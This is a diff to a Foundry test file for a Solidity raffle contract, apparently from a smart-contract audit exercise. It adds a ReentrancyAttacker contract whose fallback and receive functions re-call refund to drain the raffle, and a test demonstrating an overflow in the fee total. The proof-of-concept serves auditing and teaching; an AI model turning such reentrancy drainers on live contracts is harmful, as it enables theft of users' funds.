@@ -247,7 +247,102 @@ contract PuppyRaffleTest is Test {
     }
 
 
+    function testReentrancyAttackCanHappen() external{
 
+    address[] memory players = new address[](3);
+    players[0] = address(111);
+    players[1] = address(100);
+    players[2] = address(200);
+    puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
+
+    uint256 startingContractBalance = address(puppyRaffle).balance;
+    ReentrancyAttacker ree = new ReentrancyAttacker(puppyRaffle);
+    uint256 startingAttackerContractBalance = address(ree).balance;
+    ree.attack{value: entranceFee}();
+
+    uint256 endingContractBalance = address(puppyRaffle).balance;
+    uint256 endingAttackerContractBalance = address(ree).balance;
+
+    console.log("the starting balance of attacker contract is: ", startingAttackerContractBalance);
+    console.log("the starting balance of contract is: ", startingContractBalance);
+    console.log("the endinging balance of attacker contract is: ", endingAttackerContractBalance);
+    console.log("the endinging balance of contract is: ", endingContractBalance);
+    }
+
+
+
+    function testThereIsOverflowIssue() external {
+        address[] memory players = new address[](4);
+        players[0] = address(1001);
+        players[1] = address(1002);
+        players[2] = address(1003);
+        players[3] = address(1004);
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+        vm.warp(block.timestamp + duration + 1);
+        puppyRaffle.selectWinner();
+        uint256 startingFee = puppyRaffle.totalFees();
+        console.log("the starting total fees is: ", startingFee);
+
+        // now next raffle begins
+        uint256 totalPlayers = 89;
+        address[] memory newPlayers = new address[](totalPlayers);
+        for(uint256 i=0; i<newPlayers.length; i++){
+            newPlayers[i] = address(i);
+        }
+        puppyRaffle.enterRaffle{value: entranceFee * totalPlayers}(newPlayers);
+        vm.warp(block.timestamp + duration + 1);
+        puppyRaffle.selectWinner();
+        uint256 endingFee = puppyRaffle.totalFees();
+        console.log("the ending total fees is: ", endingFee);
+
+        assert(startingFee > endingFee);
+    }
+
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+contract ReentrancyAttacker {
+
+    PuppyRaffle puppy;
+    uint256 fees;
+    uint256 playerIndex;
+
+    constructor(PuppyRaffle _puppy){
+        puppy = _puppy;
+
+    }
+
+    function attack() external payable{
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        fees = puppy.entranceFee();
+        puppy.enterRaffle{value: fees}(players);
+        playerIndex = puppy.getActivePlayerIndex(address(this));
+        puppy.refund(playerIndex);
+    }
+
+    fallback() external payable{
+        if(address(puppy).balance >= fees){
+            puppy.refund(playerIndex);
+        }
+    }
+
+    receive() external payable{
+        if(address(puppy).balance >= fees){
+            puppy.refund(playerIndex);
+        }
+    }
 
 
 }
